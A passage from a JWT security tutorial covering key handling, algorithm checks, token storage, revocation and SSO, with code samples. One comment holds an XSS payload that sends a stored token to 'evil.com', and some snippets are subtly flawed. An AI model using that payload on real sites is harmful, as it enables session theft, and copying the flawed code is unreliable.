### 2. **Secret Key Security**

```python
# ❌ BAD: Hardcoded secret
secret = "mypassword123"

# ✅ GOOD: Environment variable, strong key
import os
import secrets

# Generate strong secret (one-time)
secret = secrets.token_urlsafe(32)
print(f"Add to .env: JWT_SECRET={secret}")

# Load from environment
secret = os.environ.get('JWT_SECRET')
if not secret:
    raise ValueError("JWT_SECRET not set!")
```

### 3. **Token Expiration**

```python
# ✅ GOOD: Short-lived access token + refresh token
access_token_ttl = 900      # 15 minutes
refresh_token_ttl = 604800  # 7 days

# Include expiration in payload
payload = {
    "exp": datetime.utcnow() + timedelta(seconds=access_token_ttl),
    "iat": datetime.utcnow(),
    # ...
}
```

### 4. **Algorithm Selection**

```python
# ❌ BAD: Allow "none" algorithm
jwt.decode(token, verify=False)  # NEVER DO THIS!

# ❌ BAD: Don't specify algorithms
jwt.decode(token, secret)

# ✅ GOOD: Explicitly specify allowed algorithms
jwt.decode(token, secret, algorithms=["HS256"])

# ✅ BETTER: Use asymmetric (RS256) for production
jwt.decode(token, public_key, algorithms=["RS256"])
```

### 5. **Payload Security**

```python
# ❌ BAD: Sensitive data in JWT
payload = {
    "password": "secret123",      # NEVER!
    "credit_card": "1234-5678",   # NEVER!
    "ssn": "123-45-6789"          # NEVER!
}

# ✅ GOOD: Only necessary, non-sensitive data
payload = {
    "sub": "user_123",
    "email": "user@example.com",
    "role": "user",
    "permissions": ["read"]
}
```

### 6. **Token Revocation**

```python
# Implement token blacklist for logout/compromise
class TokenBlacklist:
    def __init__(self):
        self.blacklist = set()  # In production: use Redis
    
    def revoke(self, token):
        """Add token to blacklist"""
        # Extract JTI (JWT ID) from token
        payload = jwt.decode(token, options={"verify_signature": False})
        jti = payload.get('jti')
        if jti:
            self.blacklist.add(jti)
            # In production: store in Redis with TTL = token expiry
    
    def is_revoked(self, token):
        """Check if token is revoked"""
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            jti = payload.get('jti')
            return jti in self.blacklist
        except:
            return True
```

### 7. **Audience Validation**

```python
# ✅ Always validate audience
payload = {
    "aud": "https://api.myapp.com",  # Who can use this token
    # ...
}

# On verification
jwt.decode(
    token,
    secret,
    algorithms=["HS256"],
    audience="https://api.myapp.com"  # Must match!
)
```

---

## Common JWT Vulnerabilities

### 1. **None Algorithm Attack**

```python
# Attacker creates token with "alg": "none"
malicious_header = {
    "alg": "none",
    "typ": "JWT"
}
malicious_payload = {
    "sub": "admin",
    "role": "admin"
}

# If server doesn't validate algorithm...
# ❌ VULNERABLE CODE:
jwt.decode(token, verify=False)  # Accepts "none"!

# ✅ SECURE CODE:
jwt.decode(token, secret, algorithms=["HS256"])  # Rejects "none"
```

### 2. **Algorithm Confusion (RS256 → HS256)**

```python
# Server uses RS256 (asymmetric)
# Attacker switches to HS256 and signs with public key

# ✅ PREVENTION: Strictly enforce algorithm
jwt.decode(
    token,
    public_key,
    algorithms=["RS256"]  # Only allow RS256
)
```

### 3. **Weak Secret Key**

```python
# ❌ Weak secrets can be brute-forced
weak_secrets = ["secret", "password", "123456", "jwt"]

# ✅ Use strong, random secrets (32+ bytes)
import secrets
strong_secret = secrets.token_urlsafe(32)
```

### 4. **Token Exposure**

```
❌ Exposing JWT in URLs:
https://api.com/reset-password?token=eyJhbGci...

Problem: Logged in browser history, server logs, proxy logs

✅ Use POST body or Authorization header:
Authorization: Bearer eyJhbGci...
```

---

## How JWT is Stored (Storage Options)

### Client-Side Storage Comparison

```
┌────────────────────────────────────────────────────────────────┐
│                   JWT Storage Options                          │
├──────────────────┬─────────────────────────────────────────────┤
│                  │          1. localStorage                     │
├──────────────────┼─────────────────────────────────────────────┤
│ Security         │ ❌ Vulnerable to XSS attacks                │
│ Accessibility    │ JavaScript can read/write                   │
│ Auto-send        │ ❌ Must manually add to requests            │
│ Expiration       │ ❌ No automatic expiration                  │
│ Size Limit       │ ~5-10 MB                                    │
│ CSRF             │ ✅ Not vulnerable                           │
│ Use Case         │ SPAs with no sensitive data                 │
├──────────────────┼─────────────────────────────────────────────┤
│                  │          2. sessionStorage                   │
├──────────────────┼─────────────────────────────────────────────┤
│ Security         │ ❌ Vulnerable to XSS attacks                │
│ Accessibility    │ JavaScript can read/write                   │
│ Auto-send        │ ❌ Must manually add to requests            │
│ Expiration       │ ✅ Cleared on tab close                     │
│ Size Limit       │ ~5-10 MB                                    │
│ CSRF             │ ✅ Not vulnerable                           │
│ Use Case         │ Single-tab sessions                         │
├──────────────────┼─────────────────────────────────────────────┤
│                  │       3. Cookie (HttpOnly)                   │
├──────────────────┼─────────────────────────────────────────────┤
│ Security         │ ✅ Protected from XSS                       │
│ Accessibility    │ ❌ JavaScript CANNOT read                   │
│ Auto-send        │ ✅ Automatically sent with requests         │
│ Expiration       │ ✅ Server-controlled                        │
│ Size Limit       │ ~4 KB                                       │
│ CSRF             │ ⚠️ Needs CSRF protection                    │
│ Use Case         │ 🏆 RECOMMENDED for production              │
├──────────────────┼─────────────────────────────────────────────┤
│                  │      4. Memory (JavaScript Variable)         │
├──────────────────┼─────────────────────────────────────────────┤
│ Security         │ ✅ Most secure (lost on refresh)            │
│ Accessibility    │ Only in current execution context           │
│ Auto-send        │ ❌ Must manually add to requests            │
│ Expiration       │ ✅ Lost on page refresh                     │
│ Size Limit       │ No practical limit                          │
│ CSRF             │ ✅ Not vulnerable                           │
│ Use Case         │ High-security apps (banking)                │
└──────────────────┴─────────────────────────────────────────────┘
```

### Code Examples: Storage Implementation

#### 1. localStorage (❌ Not Recommended)

```javascript
// ❌ INSECURE: Vulnerable to XSS
class TokenStorageLocalStorage {
    saveToken(token) {
        localStorage.setItem('access_token', token);
    }
    
    getToken() {
        return localStorage.getItem('access_token');
    }
    
    removeToken() {
        localStorage.removeItem('access_token');
    }
    
    // Must manually add to requests
    async makeAuthRequest(url) {
        const token = this.getToken();
        const response = await fetch(url, {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });
        return response.json();
    }
}

// XSS Attack Example:
// If attacker injects: <script>
//   fetch('https://evil.com?token=' + localStorage.getItem('access_token'))
// </script>
// Your token is stolen! ⚠️
```

#### 2. HttpOnly Cookie (✅ RECOMMENDED)

```javascript
// ✅ SECURE: Protected from XSS
// Server-side (Node.js/Express)
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // Authenticate user...
    const token = generateJWT(userId);
    
    // Set HttpOnly cookie
    res.cookie('access_token', token, {
        httpOnly: true,      // ✅ Not accessible via JavaScript
        secure: true,        // ✅ Only sent over HTTPS
        sameSite: 'strict',  // ✅ CSRF protection
        maxAge: 900000,      // 15 minutes
        path: '/',
        domain: '.example.com'  // Share across subdomains
    });
    
    res.json({ success: true });
});

// Client-side (Browser)
// No need to manually handle token!
async function makeAuthRequest(url) {
    // Cookie automatically included by browser
    const response = await fetch(url, {
        credentials: 'include'  // Include cookies in request
    });
    return response.json();
}

// Logout endpoint
app.post('/logout', (req, res) => {
    res.clearCookie('access_token');
    res.json({ success: true });
});
```

#### 3. Memory Storage (Highest Security)

```javascript
// ✅ MOST SECURE: Lost on refresh
class TokenStorageMemory {
    constructor() {
        this.token = null;  // Only in memory
    }
    
    saveToken(token) {
        this.token = token;
    }
    
    getToken() {
        return this.token;
    }
    
    removeToken() {
        this.token = null;
    }
}

// Token lost on page refresh
// User must login again
// Best for banking/financial apps
```

#### 4. Hybrid Approach (Best Practice)

```javascript
// ✅ BEST PRACTICE: HttpOnly cookie + localStorage for metadata
// Server sets HttpOnly cookie with JWT
app.post('/login', (req, res) => {
    const token = generateJWT(userId);
    
    // JWT in HttpOnly cookie
    res.cookie('access_token', token, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 900000
    });
    
    // Non-sensitive metadata in response
    res.json({
        success: true,
        user: {
            id: userId,
            name: userName,
            role: userRole
        },
        expiresAt: Date.now() + 900000
    });
});

// Client stores metadata (NOT token) in localStorage
localStorage.setItem('user', JSON.stringify({
    id: userId,
    name: userName,
    role: userRole
}));

// Client knows when to refresh token
const expiresAt = Date.now() + 900000;
localStorage.setItem('token_expires_at', expiresAt);

// Check if token expired (client-side)
function isTokenExpired() {
    const expiresAt = localStorage.getItem('token_expires_at');
    return Date.now() > parseInt(expiresAt);
}
```

---

## Is JWT Stateless or Stateful?

### Pure JWT: Stateless

```
┌────────────────────────────────────────────────────────────┐
│                 Stateless JWT Architecture                 │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────┐                              ┌────────────┐ │
│  │  Client  │                              │ API Server │ │
│  └────┬─────┘                              └─────┬──────┘ │
│       │                                           │        │
│       │  1. Request with JWT                     │        │
│       │  Authorization: Bearer eyJhbGci...       │        │
│       ├──────────────────────────────────────────>│       │
│       │                                           │        │
│       │              2. Verify JWT (NO DB LOOKUP)│        │
│       │                 ┌──────────────┐         │        │
│       │                 │ Decode JWT   │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │                 ┌──────▼───────┐         │        │
│       │                 │ Verify Sig   │         │        │
│       │                 │ with Public  │         │        │
│       │                 │ Key          │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │                 ┌──────▼───────┐         │        │
│       │                 │ Validate     │         │        │
│       │                 │ Claims       │         │        │
│       │                 │ (exp, aud)   │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │                    ✅ Valid             │        │
│       │                                           │        │
│       │  3. Return Data                          │        │
│       │<──────────────────────────────────────────┤       │
│       │                                           │        │
│                                                             │
│  ✅ Advantages:                                            │
│  • No database lookup                                      │
│  • Fast verification                                       │
│  • Scales horizontally                                     │
│  • No server-side session storage                          │
│                                                             │
│  ❌ Disadvantages:                                         │
│  • Cannot revoke token before expiry                       │
│  • Must wait for token to expire                           │
│  • If compromised, valid until expiry                      │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### Stateful JWT: Hybrid Approach

```
┌────────────────────────────────────────────────────────────┐
│              Stateful JWT Architecture                     │
│          (JWT + Server-Side Validation)                    │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────┐                              ┌────────────┐ │
│  │  Client  │                              │ API Server │ │
│  └────┬─────┘                              └─────┬──────┘ │
│       │                                           │        │
│       │  1. Request with JWT                     │        │
│       │  Authorization: Bearer eyJhbGci...       │        │
│       ├──────────────────────────────────────────>│       │
│       │                                           │        │
│       │              2. Verify JWT Signature     │        │
│       │                 ┌──────────────┐         │        │
│       │                 │ Verify Sig   │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │              3. Check Blacklist/DB       │        │
│       │                 ┌──────▼───────┐         │        │
│       │                 │ Redis/DB     │         │        │
│       │                 │ Lookup       │         │        │
│       │                 │              │         │        │
│       │                 │ SELECT *     │         │        │
│       │                 │ FROM tokens  │         │        │
│       │                 │ WHERE jti=?  │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │                 ┌──────▼───────┐         │        │
│       │                 │ Is Revoked?  │         │        │
│       │                 └──────┬───────┘         │        │
│       │                        │                 │        │
│       │                    ✅ Valid             │        │
│       │                                           │        │
│       │  4. Return Data                          │        │
│       │<──────────────────────────────────────────┤       │
│       │                                           │        │
│                                                             │
│  ✅ Advantages:                                            │
│  • Can revoke tokens instantly                             │
│  • Logout works immediately                                │
│  • Better security control                                 │
│                                                             │
│  ❌ Disadvantages:                                         │
│  • Database lookup required (slower)                       │
│  • Not truly stateless                                     │
│  • Loses some scalability benefits                         │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### Comparison: Stateless vs Stateful JWT

```
┌────────────────────────────────────────────────────────────┐
│              Stateless vs Stateful JWT                     │
├──────────────────┬────────────────┬────────────────────────┤
│                  │   STATELESS    │      STATEFUL          │
├──────────────────┼────────────────┼────────────────────────┤
│ Server Storage   │ ❌ None        │ ✅ Token blacklist     │
│ Database Lookup  │ ❌ No          │ ✅ Yes                 │
│ Revocation       │ ❌ Impossible  │ ✅ Instant             │
│ Scalability      │ ✅ Excellent   │ ⚠️ Good                │
│ Speed            │ ✅ Very Fast   │ ⚠️ Fast                │
│ Logout           │ ❌ Must wait   │ ✅ Immediate           │
│ Complexity       │ ✅ Simple      │ ⚠️ More complex        │
│ Security         │ ⚠️ Good        │ ✅ Better              │
└──────────────────┴────────────────┴────────────────────────┘
```

### Best Practice: Hybrid Stateless Approach

```python
# ✅ RECOMMENDED: Short-lived JWT + Refresh Token
class HybridJWTService:
    def __init__(self):
        self.access_token_ttl = 900       # 15 minutes (stateless)
        self.refresh_token_ttl = 604800   # 7 days (stateful)
        self.refresh_tokens = {}          # Store in Redis/DB
    
    def login(self, user_id):
        # Short-lived access token (stateless)
        access_token = self.create_jwt(
            user_id=user_id,
            token_type="access",
            ttl=self.access_token_ttl
        )
        
        # Long-lived refresh token (stateful - stored server-side)
        refresh_token = self.create_jwt(
            user_id=user_id,
            token_type="refresh",
            ttl=self.refresh_token_ttl
        )
        
        # Store refresh token in database/Redis
        self.refresh_tokens[refresh_token] = {
            'user_id': user_id,
            'created_at': time.time(),
            'last_used': time.time()
        }
        
        return {
            'access_token': access_token,   # No DB lookup needed
            'refresh_token': refresh_token,  # DB lookup required
            'expires_in': self.access_token_ttl
        }
    
    def logout(self, refresh_token):
        # Remove refresh token from storage
        if refresh_token in self.refresh_tokens:
            del self.refresh_tokens[refresh_token]
        
        # Access token will expire naturally (15 min max)
        return {'success': True}
    
    def refresh_access_token(self, refresh_token):
        # Check if refresh token exists (stateful check)
        if refresh_token not in self.refresh_tokens:
            raise ValueError("Invalid refresh token")
        
        # Generate new access token (stateless)
        user_id = self.refresh_tokens[refresh_token]['user_id']
        new_access_token = self.create_jwt(
            user_id=user_id,
            token_type="access",
            ttl=self.access_token_ttl
        )
        
        return {'access_token': new_access_token}

# Benefits:
# ✅ Access token is stateless (99% of requests)
# ✅ Can revoke via refresh token invalidation
# ✅ Compromise window is only 15 minutes
# ✅ Scales well (most requests don't hit DB)
```

---

## Best Practices for Using JWT

### 1. Token Lifetime Strategy

```
┌────────────────────────────────────────────────────────────┐
│              Token Lifetime Recommendations                │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  Application Type       Access Token    Refresh Token      │
│  ────────────────       ────────────    ──────────────     │
│                                                             │
│  Web App (SPA)          15 minutes      7 days             │
│  Mobile App             30 minutes      30 days            │
│  Desktop App            60 minutes      90 days            │
│  API (M2M)              1 hour          No refresh         │
│  Banking/Finance        5 minutes       1 day              │
│  Internal Tools         1 hour          30 days            │
│  IoT Devices            6 hours         1 year             │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### 2. Token Rotation

```javascript
// ✅ Automatic token refresh before expiry
class TokenManager {
    constructor(accessToken, refreshToken, expiresIn) {
        this.accessToken = accessToken;
        this.refreshToken = refreshToken;
        this.expiresAt = Date.now() + (expiresIn * 1000);
        
        // Refresh 5 minutes before expiry
        this.scheduleRefresh();
    }
    
    scheduleRefresh() {
        const timeUntilExpiry = this.expiresAt - Date.now();
        const refreshBuffer = 5 * 60 * 1000;  // 5 minutes
        const refreshTime = timeUntilExpiry - refreshBuffer;
        
        if (refreshTime > 0) {
            setTimeout(() => this.refreshToken(), refreshTime);
        }
    }
    
    async refreshToken() {
        try {
            const response = await fetch('/api/refresh', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    refresh_token: this.refreshToken
                })
            });
            
            const data = await response.json();
            
            // Update tokens
            this.accessToken = data.access_token;
            this.expiresAt = Date.now() + (data.expires_in * 1000);
            
            // Schedule next refresh
            this.scheduleRefresh();
            
        } catch (error) {
            console.error('Token refresh failed:', error);
            // Redirect to login
            window.location.href = '/login';
        }
    }
}
```

### 3. Security Checklist

```
✅ JWT Security Best Practices Checklist:

Storage:
  ✅ Use HttpOnly cookies (not localStorage)
  ✅ Set Secure flag (HTTPS only)
  ✅ Set SameSite=Strict (CSRF protection)
  ✅ Set appropriate Domain and Path

Token Creation:
  ✅ Use strong signing algorithm (RS256 > HS256)
  ✅ Include 'iss' (issuer) claim
  ✅ Include 'aud' (audience) claim
  ✅ Include 'exp' (expiration) claim
  ✅ Include 'jti' (unique ID) for revocation
  ✅ Use short expiration times (15 min)

Token Validation:
  ✅ Verify signature
  ✅ Validate 'exp' (not expired)
  ✅ Validate 'nbf' (not before)
  ✅ Validate 'iss' (trusted issuer)
  ✅ Validate 'aud' (intended audience)
  ✅ Check token blacklist (if using)

Secret Management:
  ✅ Use environment variables
  ✅ Rotate secrets regularly
  ✅ Use strong, random secrets (32+ bytes)
  ✅ Never commit secrets to version control
  ✅ Use different secrets for dev/staging/prod

Content:
  ❌ Never store passwords in JWT
  ❌ Never store sensitive PII
  ❌ Never store credit card data
  ✅ Only store minimal, non-sensitive data

Transport:
  ✅ Always use HTTPS
  ✅ Use Authorization header (not URL)
  ✅ Implement rate limiting
  ✅ Log suspicious activity
```

---

## JWT in Single Sign-On (SSO)

### What is SSO with JWT?

**Single Sign-On (SSO)** allows users to authenticate once and access multiple applications without re-entering credentials. JWT is commonly used as the token format in SSO systems.

### SSO Architecture with JWT

```
┌─────────────────────────────────────────────────────────────────┐
│                    SSO Flow with JWT                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│                         Identity Provider (IdP)                  │
│                      (Auth0, Okta, Keycloak)                    │
│                      ┌──────────────────┐                       │
│                      │  Authentication  │                       │
│                      │     Server       │                       │
│                      └────────┬─────────┘                       │
│                               │                                  │
│                               │ Issues JWT                       │
│                               │                                  │
│         ┌─────────────────────┼─────────────────────┐           │
│         │                     │                     │           │
│         ▼                     ▼                     ▼           │
│  ┌────────────┐        ┌────────────┐       ┌────────────┐    │
│  │   App 1    │        │   App 2    │       │   App 3    │    │
│  │  (Gmail)   │        │  (Drive)   │       │ (Calendar) │    │
│  └────────────┘        └────────────┘       └────────────┘    │
│                                                                  │
│  User logs in ONCE → Gets JWT → Accesses ALL apps              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Complete SSO Flow (Step-by-Step)

```
┌──────────┐         ┌──────────┐         ┌─────────────┐         ┌──────────┐
│  User    │         │  App 1   │         │     IdP     │         │  App 2   │
│ (Browser)│         │ (Gmail)  │         │ (Auth0)     │         │ (Drive)  │
└────┬─────┘         └────┬─────┘         └──────┬──────┘         └────┬─────┘
     │                    │                       │                     │
     │  1. Visit App 1    │                       │                     │
     ├───────────────────>│                       │                     │
     │                    │                       │                     │
     │  2. Not authenticated, redirect to IdP     │                     │
     │<───────────────────┤                       │                     │
     │                    │                       │                     │
     │  3. Redirected to IdP login page           │                     │
     ├──────────────────────────────────────────>│                     │
     │                    │                       │                     │
     │  4. Enter credentials (username/password)  │                     │
     ├──────────────────────────────────────────>│                     │
     │                    │                       │                     │
     │                    │        5. Validate credentials             │
     │                    │           ✅ User authenticated            │
     │                    │                       │                     │
     │                    │        6. Create JWT  │                     │
     │                    │           ┌──────────────────┐             │
     │                    │           │ Header:          │             │
     │                    │           │ {"alg":"RS256"}  │             │
     │                    │           ├──────────────────┤             │
     │                    │           │ Payload:         │             │
     │                    │           │ {sub: "user123"} │             │
     │                    │           │ {iss: "auth0"}   │             │
     │                    │           │ {aud: ["app1",   │             │
     │                    │           │       "app2",    │             │
     │                    │           │       "app3"]}   │             │
     │                    │           │ {exp: ...}       │             │
     │                    │           └──────────────────┘             │
     │                    │                       │                     │
     │  7. Redirect back to App 1 with JWT       │                     │
     │<──────────────────────────────────────────┤                     │
     │  https://gmail.com/callback?token=eyJhbG...│                     │
     │                    │                       │                     │
     │  8. Extract JWT    │                       │                     │
     ├───────────────────>│                       │                     │
     │                    │                       │                     │
     │                    │  9. Verify JWT with IdP's public key       │
     │                    │     (Fetch JWKS from IdP)                  │
     │                    │                       │                     │
     │  10. Set session cookie, access granted    │                     │
     │<───────────────────┤                       │                     │
     │                    │                       │                     │
     │  ✅ Using App 1    │                       │                     │
     │                    │                       │                     │
     │                                                                  │
     │  11. Visit App 2 (same session, has JWT in cookie)              │
     ├────────────────────────────────────────────────────────────────>│
     │                    │                       │                     │
     │                    │                       │  12. JWT already present
     │                    │                       │      Verify signature
     │                    │                       │      Check 'aud' includes "app2"
     │                    │                       │      ✅ Valid      │
     │                    │                       │                     │
     │  13. Access granted (NO re-authentication!)│                     │
     │<────────────────────────────────────────────────────────────────┤
     │                    │                       │                     │
     │  ✅ Using App 2    │                       │                     │
     │                    │                       │                     │
     └────────────────────────────────────────────────────────────────────
     
     User authenticated ONCE, accessed TWO apps without re-login!
```

### JWT Structure in SSO

```json
{
  // Header
  "alg": "RS256",
  "typ": "JWT",
  "kid": "auth0-key-2024"
}
{
  // Payload
  "iss": "https://auth.example.com",           // Identity Provider
  "sub": "user_12345",                          // User ID
  "aud": [                                      // Multiple audiences
    "https://gmail.example.com",
    "https://drive.example.com",
    "https://calendar.example.com"
  ],
  "exp": 1735689600,                            // Expiration
  "iat": 1735603200,                            // Issued at
  "email": "user@example.com",
  "name": "John Doe",
  "roles": ["user", "editor"],
  
  // SSO-specific claims
  "session_id": "sess_abc123",                  // SSO session ID
  "auth_time": 1735603200,                      // When user authenticated
  "amr": ["pwd", "mfa"],                        // Auth methods: password + MFA
  "acr": "urn:mace:incommon:iap:silver"        // Auth context class
}
```

### SSO Implementation Example

```python
# Identity Provider (IdP)
class SSOIdentityProvider:
    """SSO Identity Provider - Issues JWTs for multiple apps"""
    
    def __init__(self, private_key, issuer_url):
        self.private_key = private_key
        self.issuer_url = issuer_url
        self.registered_apps = {
            'app1': {
                'name': 'Gmail',
                'audience': 'https://gmail.example.com',
                'redirect_uri': 'https://gmail.example.com/callback'
            },
            'app2': {
                'name': 'Drive',
                'audience': 'https://drive.example.com',
                'redirect_uri': 'https://drive.example.com/callback'
            },
            'app3': {
                'name': 'Calendar',
                'audience': 'https://calendar.example.com',
                'redirect_uri': 'https://calendar.example.com/callback'
            }
        }
    
    def authenticate_user(self, username, password):
        """Authenticate user and create SSO session"""
        # Verify credentials (check database)
        user = self.verify_credentials(username, password)
        if not user:
            return {'success': False, 'error': 'Invalid credentials'}
        
        # Create SSO session
        session_id = self.create_sso_session(user['id'])
        
        # Create JWT with multiple audiences
        jwt_token = self.create_sso_token(
            user_id=user['id'],
            email=user['email'],
            name=user['name'],
            roles=user['roles'],
            session_id=session_id,
            audiences=[app['audience'] for app in self.registered_apps.values()]
        )
        
        return {
            'success': True,
            'token': jwt_token,
            'session_id': session_id,
            'user': user
        }
    
    def create_sso_token(self, user_id, email, name, roles, session_id, audiences):
        """Create JWT for SSO with multiple audiences"""
        now = datetime.utcnow()
        
        payload = {
            # Standard claims
            'iss': self.issuer_url,
            'sub': user_id,
            'aud': audiences,  # Multiple apps can use this token
            'exp': now + timedelta(hours=8),  # 8 hour SSO session
            'iat': now,
            'jti': f'sso_{session_id}_{int(time.time())}',
            
            # User info
            'email': email,
            'name': name,
            'roles': roles,
            
            # SSO-specific
            'session_id': session_id,
            'auth_time': int(now.timestamp()),
            'amr': ['pwd', 'mfa']  # Authentication methods
        }
        
        # Sign with private key
        token = jwt.encode(
            payload,
            self.private_key,
            algorithm='RS256',
            headers={'kid': 'sso-key-2024'}
        )
        
        return token


# Service Provider (Application)
class SSOServiceProvider:
    """Application that uses SSO for authentication"""
    
    def __init__(self, app_name, audience, idp_public_key, idp_issuer):
        self.app_name = app_name
        self.audience = audience
        self.idp_public_key = idp_public_key
        self.idp_issuer = idp_issuer
    
    def handle_sso_callback(self, token):
        """Handle callback from IdP with JWT token"""
        try:
            # Verify JWT
            payload = jwt.decode(
                token,
                self.idp_public_key,
                algorithms=['RS256'],
                audience=self.audience,
                issuer=self.idp_issuer,
                options={
                    'verify_signature': True,
                    'verify_exp': True,
                    'verify_aud': True,
                    'verify_iss': True
                }
            )
            
            # Check if this app is in the audience
            audiences = payload.get('aud', [])
            if isinstance(audiences, str):
                audiences = [audiences]
            
            if self.audience not in audiences:
                return {'success': False, 'error': 'Token not intended for this app'}
            
            # Create local session
            user_session = {
                'user_id': payload['sub'],
                'email': payload['email'],
                'name': payload['name'],
                'roles': payload['roles'],
                'sso_session_id': payload['session_id'],
                'authenticated_at': payload['auth_time']
            }
            
            return {
                'success': True,
                'user': user_session
            }
        
        except jwt.ExpiredSignatureError:
            return {'success': False, 'error': 'Token expired'}
        except jwt.InvalidTokenError as e:
            return {'success': False, 'error': f'Invalid token: {str(e)}'}


# Example Usage
print("=" * 60)
print("SSO Flow Example")
print("=" * 60)

# 1. User authenticates with IdP
idp = SSOIdentityProvider(
    private_key=load_private_key(),
    issuer_url='https://auth.example.com'
)

auth_result = idp.authenticate_user('john@example.com', 'password123')
if auth_result['success']:
    print(f"✅ User authenticated")
    print(f"SSO Token: {auth_result['token'][:50]}...")
    sso_token = auth_result['token']

# 2. User accesses App 1 (Gmail)
app1 = SSOServiceProvider(
    app_name='Gmail',
    audience='https://gmail.example.com',
    idp_public_key=load_public_key(),
    idp_issuer='https://auth.example.com'
)

app1_result = app1.handle_sso_callback(sso_token)
if app1_result['success']:
    print(f"\n✅ App 1 (Gmail) access granted")
    print(f"User: {app1_result['user']['email']}")

# 3. User accesses App 2 (Drive) - Same token!
app2 = SSOServiceProvider(
    app_name='Drive',
    audience='https://drive.example.com',
    idp_public_key=load_public_key(),
    idp_issuer='https://auth.example.com'
)

app2_result = app2.handle_sso_callback(sso_token)
if app2_result['success']:
    print(f"\n✅ App 2 (Drive) access granted")
    print(f"User: {app2_result['user']['email']}")
    print(f"No re-authentication needed! 🎉")
```

### SSO Protocols Using JWT

```
┌────────────────────────────────────────────────────────────┐
│              SSO Protocols with JWT                        │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  1. OpenID Connect (OIDC)                                  │
│     ─────────────────────                                  │
│     • Built on OAuth 2.0                                   │
│     • Uses JWT for ID tokens                               │
│     • Most popular modern SSO                              │
│     • Examples: Auth0, Okta, Google Sign-In               │
│                                                             │
│     Flow:                                                   │
│     User → IdP → JWT ID Token → App                       │
│                                                             │
│     ID Token Structure:                                     │
│     {                                                       │
│       "iss": "https://accounts.google.com",                │
│       "aud": "your-app-client-id",                         │
│       "sub": "110169484474386276334",                      │
│       "email": "user@example.com",                         │
│       "email_verified": true,                              │
│       "name": "John Doe",                                  │
│       "picture": "https://...",                            │
│       "exp": 1735689600                                    │
│     }                                                       │
│                                                             │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  2. SAML (Security Assertion Markup Language)              │
│     ────────────────────────────────────────               │
│     • XML-based (older standard)                           │
│     • Enterprise SSO                                       │
│     • Can use JWT in newer implementations                 │
│     • Examples: Shibboleth, ADFS                           │
│                                                             │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  3. OAuth 2.0 + JWT                                        │
│     ─────────────────                                      │
│     • JWT as access token                                  │
│     • API authorization                                    │
│     • Examples: GitHub, GitLab                             │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### SSO Logout (Single Logout)

```python
class SSOLogout:
    """Handle SSO logout across all applications"""
    
    def __init__(self, idp_url):
        self.idp_url = idp_url
        self.active_sessions = {}
    
    def logout(self, session_id, user_id):
        """
        Single logout: Invalidate session across all apps
        """
        # 1. Revoke SSO session at IdP
        self.revoke_sso_session(session_id)
        
        # 2. Get all apps user is logged into
        apps = self.get_user_apps(session_id)
        
        # 3. Send logout notification to all apps
        for app in apps:
            self.notify_app_logout(app, user_id)
        
        # 4. Clear session
        if session_id in self.active_sessions:
            del self.active_sessions[session_id]
        
        return {'success': True, 'apps_logged_out': len(apps)}
    
    def notify_app_logout(self, app, user_id):
        """Send logout notification to application"""
        # Apps listen for logout events via:
        # - Backchannel logout (HTTP POST)
        # - Front-channel logout (iframe)
        # - Token revocation endpoint
        
        logout_token = self.create_logout_token(user_id, app)
        
        # POST to app's logout endpoint
        requests.post(
            app['logout_endpoint'],
            json={'logout_token': logout_token}
        )
```

---

## Summary

### Key Concepts:

1. **JWT Structure**:
   - Header (algorithm + metadata)
   - Payload (claims)
   - Signature (verification)

2. **Claims**:
   - Registered: iss, sub, aud, exp, nbf, iat, jti
   - Public: standardized claims
   - Private: custom application claims

3. **Signing**:
   - Symmetric (HS256): Same key for sign/verify
   - Asymmetric (RS256): Private key signs, public key verifies

4. **Storage**:
   - 🏆 **Best**: HttpOnly cookies (XSS protection)
   - ⚠️ **Avoid**: localStorage (vulnerable to XSS)
   - ✅ **High security**: Memory storage (lost on refresh)

5. **Stateless vs Stateful**:
   - **Pure JWT**: Stateless (no DB lookup, cannot revoke)
   - **Hybrid**: Short-lived access + stateful refresh token
   - 🏆 **Recommended**: 15-min access + 7-day refresh

6. **JWS**: Specification for signing JSON (JWT is a type of JWS)

7. **JWKS**: Public key set for verifying JWTs (key rotation)

8. **SSO with JWT**:
   - Single authentication for multiple apps
   - JWT with multiple audiences
   - OpenID Connect (OIDC) most common
   - Single logout support

9. **Security**:
   - ✅ Use strong secrets/keys
   - ✅ Short expiration times
   - ✅ Validate all claims
   - ✅ Use HTTPS
   - ✅ Store in HttpOnly cookies
   - ❌ Never store sensitive data
   - ❌ Never use "none" algorithm

**Best Practice Flow:**
- Access token: 15 minutes (HS256/RS256) - stateless
- Refresh token: 7 days (stored server-side) - stateful
- Store in HttpOnly cookies with Secure + SameSite flags
- Rotate keys regularly
- Implement token blacklist for critical revocation
- Use SSO for multi-app environments

